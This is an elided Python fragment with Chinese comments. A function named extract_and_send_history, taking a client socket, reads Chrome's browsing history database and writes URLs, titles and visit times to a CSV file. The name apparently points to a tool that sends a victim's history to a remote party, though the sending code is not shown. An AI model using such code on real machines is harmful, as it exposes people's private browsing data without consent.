...
def extract_and_send_history(client_socket):
    ...
    # 查询浏览历史记录，排除书签，并按照最后访问时间降序排序
    cursor.execute("SELECT url, title, last_visit_time FROM urls WHERE visit_count > 0 ORDER BY last_visit_time DESC")
    ...
    # 创建文件路径
    output_path = os.path.join(os.getcwd(), 'history_output.csv')

    # 打开一个 CSV 文件，准备写入历史记录
    with open(output_path, 'w', encoding='utf-8-sig', newline='') as csv_file:
        ...
        for row in cursor.fetchall():
            ...
            readable_time = chrome_time_to_readable(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')  # 格式化为 ISO 8601
            # 将最后访问时间转换为可读格式
            writer.writerow([readable_time, title, url])  # 将历史记录写入 CSV 文件
